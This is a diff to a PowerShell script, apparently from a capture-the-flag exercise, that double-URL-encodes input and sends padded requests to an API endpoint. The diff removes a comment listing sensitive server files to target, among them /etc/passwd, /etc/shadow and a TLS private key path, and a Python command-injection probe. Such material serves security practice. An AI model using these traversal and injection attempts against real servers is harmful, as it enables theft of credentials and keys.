@@ -96,6 +96,7 @@ function Escape-StringForURL {
         "`""  = "%2522"
         "``"  = "%2560"
     }
+
     # Loop through each key-value pair in the hashtable and perform the replacement
     foreach ($key in $charMap.Keys) {
         $inputString = $inputString -replace [Regex]::Escape($key), $charMap[$key]
@@ -123,17 +124,6 @@ for ($i = 0; $i -lt $DoubleNonce.Length; $i += 2) {
     $byte = [System.Convert]::ToByte($hexByte, 16)
     $DoubleNonceEncoded += "%25" + [System.BitConverter]::ToString($byte).Replace("-", "").ToLower()
 }
-
-<#
-Files known to exist on the api server.
-/etc/passwd
-/etc/resolv.conf
-/etc/nginx/certs/api.frostbit.app.key
-
-__import__('os').system('/bin/id') ???
-/etc/shadow ???
-#>
-
 $found = $false
 
 0..15 | % {
@@ -141,7 +131,7 @@ $found = $false
     # base url
     $url = "https://api.frostbit.app/view/"
     
-    $Padding = 'A' * $_
+    $Padding = 'X' * $_
     
     $url += $Padding
     
